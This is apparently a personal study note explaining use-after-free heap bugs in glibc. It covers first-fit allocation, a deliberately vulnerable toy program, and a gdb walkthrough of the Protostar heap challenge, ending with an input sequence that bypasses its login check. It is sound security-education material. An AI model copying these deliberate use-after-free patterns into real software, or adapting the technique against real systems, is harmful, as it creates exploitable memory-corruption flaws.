
## Use-After-Free
> use after free vulnerability and exploiation  
:syringe: Learned and noted for everyone :syringe:

**:alien: First fit behavior :alien:**
```
#include <stdio.h>
#include <stdlib.h>

int main()
{
        char *a = malloc(8);
        char *b = malloc(8);
        printf("Before free\n");
        printf("*a -> %p\n",a);
        printf("*b -> %p\n",b);
        printf("Freeing a&b ...\nfree'd a\nfree'd b");
        free(a);
        free(b);
        printf("Use After Free\n");
        a=malloc(8);
        b=malloc(8);
        printf("a -> %p\n",a);
        printf("b -> %p\n",b);
}

```
:scroll: :scroll: soruce code definition :scroll: :scroll:

 - `*a` & `*b` are respectively allocated 8 bytes at dynamic memory for each
 - and then we free'd this `a` & `b`
 - use again free'd chunk to see glibc's first fit behavior

:hammer: :hammer: testing program :hammer: :hammer:
```
Before free
*a -> 0x5696f160
*b -> 0x5696f170
Freeing a&b ...
free'd a
free'd b
Use After Free
a -> 0x5696f170
b -> 0x5696f160
```
 - *a -> `0x5696f160` and 	*b -> `0x5696f170` , thats how allocated in heap
 - let's check out allocation result after free
 - a -> `0x5696f170` and b -> `0x5696f160` , it was reverse ? Why?
 
:mag: :mag: debugging in gdb  :mag_right: :mag_right: 
  - you can check out some gdb and heap relationship at simple heap overflow
  - you have to set 1 breakpoint at first call for free and check heap memory

gdb hook for heap

```
gdb-peda$ define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x 0x5655a158
>x/2i $eip
>end
```
alocated result

```
0x5655a158:     0x00000000      0x00000011      0x00000000      0x00000000
0x5655a168:     0x00000000      0x00000011      0x00000000      0x00000000
```
free'd result
```
0x5655a158:     0x00000000      0x00000011      0x00000000      0x00000000
0x5655a168:     0x00000000      0x00000011      0x5655a160      0x00000000
```
revisiting free'd chunk structure

```
structure
[ prev_size       chunk_size      forward_pointer  backward_pointer ]
free'd a
[ 0x00000000      0x00000011      0x00000000       0x00000000 ]
free'd b
[ 0x00000000      0x00000011      0x5655a160       0x00000000 ]
```
 - heap is doubly-linklist data structure 

doubly-linklist figure
![enter image description here](https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Doubly_linked_list.png/800px-Doubly_linked_list.png)
 - when free'd `b` , fd is pointing to `0x5655a160` as next free chunk
 - for example , `head -> b -> a -> tail` and when we allocated for a `head -> a -> tail [ b returned ]` 
 - now we have `head -> a -> tail` and when we allocated for b `head -> tail [ a returned ]`
 - we got `a -> 0x5696f170` and `b -> 0x5696f160` for use after free
 - this is glibc's first fit behavior

**:hear_no_evil: simple Use-After-Free vulnerability :hear_no_evil:**

```
#include <stdio.h>  
#include <stdlib.h>
#include <string.h>

	int main(int argc,  char  **argv)  {  
	char  *checkpoint=malloc(8); 
	printf("checkpoint allocated at -> %p\n",checkpoint); printf("freed checkpoint\n"); 
	free(checkpoint);  
	char  *input=malloc(8); 
	printf("input allocated at -> %p\n",input); 
  strcpy(input,argv[1]);  
	if(checkpoint)  { 
		printf("Nice xD\n");  
	}  
}
```
:scroll: :scroll: soruce code definition :scroll: :scroll:

 - `char  *checkpoint=malloc(8);` - > this is the check point or targeted chunk
 - `free(checkpoint);` -> we free'd checkpoint
 - `char  *input=malloc(8);` -> use after free
 - `strcpy(input,argv[1]);` -> copying user argument to input
 - `if(checkpoint)` -> Boom!
 - actually there is nothing for checkpoint , but look

:hammer: :hammer: testing program :hammer: :hammer:
```
./uaf AAA
checkpoint allocated at -> 0x58410160
freed checkpoint
input allocated at -> 0x58410160
Nice xD
```
 - now we can see `checkpoint` & `input` are pointing to same address `0x58410160` 
 - we free'd checkpoint but this is still pointing to its address

**:busts_in_silhouette: heap3.c from protostar :busts_in_silhouette:**

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
	char name[32];
	int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv){
	char line[128];
	while(1) 
	{
		printf("[ auth = %p, service = %p ]\n", auth, service);
		if(fgets(line, sizeof(line), stdin) == NULL) break;
		if(strncmp(line, "auth ", 5) == 0) 
		{
			auth = malloc(sizeof(auth));
			memset(auth, 0, sizeof(auth));
			if(strlen(line + 5) < 31) 
			{
				strcpy(auth->name, line + 5);
			}
		}
		if(strncmp(line, "reset", 5) == 0) 
		{
			free(auth);
		}
		if(strncmp(line, "service", 6) == 0) 
		{
			service = strdup(line + 7);
		}
		if(strncmp(line, "login", 5) == 0)
		{		
			if(auth->auth) {
				printf("you have logged in already!\n");
			} 
			else 
			{
				printf("please enter your password\n");
			}
		}
	}
}
```
:scroll: :scroll: soruce code definition :scroll: :scroll:

 - in this challenge, `auth` & `service` is the point of UAF vulnerability
 - if we call auth from command line argument, `auth = malloc(sizeof(auth));` -> program will allocate on the heap
 - if we call service, `strdup(line + 7);` -> returns a pointer to a null-terminated string
 - if we call reset, `free(auth);` -> the program will free to auth
 - if we call login, `if(auth->auth)` -> the program will check this conition

:hammer: :hammer: testing program :hammer: :hammer:
```
$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
auth BBBB
[ auth = 0x804c018, service = (nil) ]
```
 - we can see how program is allocating at heap memory, but let's look detail in gdb
 - set a breakpoint at `malloc` and examine heap wiht `auth AAAA`
 - we continue `c` and examine for `auth BBBB`

:mag: :mag: debugging in gdb  :mag_right: :mag_right:
 
  - set breakpoints `malloc` from auth , `free` from reset , `strdup` from service and `strcmp` from login
```
(gdb) break *main+237
Breakpoint 3 at 0x8048a21: file heap2/heap2.c, line 32.
(gdb) break *main+292
Breakpoint 4 at 0x8048a58: file heap2/heap2.c, line 35.
(gdb) break *main+245
Breakpoint 5 at 0x8048a29: file heap2/heap2.c, line 32.
(gdb) break *main+325
Breakpoint 6 at 0x8048a79: file heap2/heap2.c, line 37.
```
 - we will call `auth AAAA` for the first time and examine in heap

:grey_question: result :grey_question:
```
0x804c000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c010:      0x00000000      0x00000ff1      0x00000000      0x00000000
```

 - `auth` has structures for 2 data types , `char *name` & `int auth`
	 - `auth->name` =  `0x00000000      0x00000011      0x41414141      0x0000000a` 16 bytes
	 - `auth->auth` =  `0x00000000      0x00000ff1      0x00000000      0x00000000` 4 bytes
 - check `*auth` and we can see what's exactly in this

```
(gdb) print *auth
$4 = {
  name = "AAAA\n\000\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
```
 
  - we will call `auth BBBB` now

:grey_question: result :grey_question:
```
0x804c000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c010:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c020:      0x00000000      0x00000fe1      0x00000000      0x00000000
```
 - check `*auth` 

```
(gdb) print *auth
$6 = {
  name = "BBBB\n\000\000\000\000\000\000\000\341\017", '\000' <repeats 17 times>, auth = 0}
```

 - when we call `login` in this situration, `auth->auth` checkpoint will fail because its still equal to zero
 - now we will free this by calling `reset`

:grey_question: result :grey_question:
```
0x804c000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c010:      0x00000000      0x00000011      0x00000000      0x0000000a
0x804c020:      0x00000000      0x00000fe1      0x00000000      0x00000000
```
 - we already free'd `auth`
 - check 	`*auth`	

```
(gdb) print *auth
$8 = {
  name = "\000\000\000\000\n\000\000\000\000\000\000\000\341\017", '\000' <repeats 17 times>, auth = 0}
```
 - still pointing to free'd chunk , so we need to call service with more than 16 bytes to overwrite `auth->auth` 
 - command `service BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB` 

:grey_question: result :grey_question:

```
0x804c000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c010:      0x00000000      0x00000011      0x00000000      0x0000000a
0x804c020:      0x00000000      0x00000029      0x42424220      0x42424242
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x00000a42      0x00000000      0x00000fb9
```
 - `auth->auth`h is successfully overwritten by `42424242`
 - and `auth` is still pointing to `0x804c018`  
 - check what we have done in `*auth->auth` now

```
(gdb) print auth->auth
$11 = 1111638594
(gdb) print *auth->auth
Cannot access memory at address 0x42424242
```
 - according to the `*auth->auth` result, there is a value `0x42424242` that we controlled via `service`
 - now `auth->auth` is not 0 but we need to hit checkpoint
 - let's call `login` to check this

:fire: :fire: final exploit :fire: :fire:

```
$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
auth BBBB
[ auth = 0x804c018, service = (nil) ]
reset
[ auth = 0x804c018, service = (nil) ]
service CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
[ auth = 0x804c018, service = 0x804c028 ]
login
you have logged in already!
```

Have fun! :v: :v: :v:

---
**:muscle: References :muscle:**  

all resources listed here :point_right: [LOL-Fav](http://location-href.com/lol-fav/)  :page_facing_up:

:snowman: Contributed and maintained by [Luna-](https://twitter.com/art0flunam00n)  
:snowflake: Powered by [Legion of LOL](http://location-href.com)

---
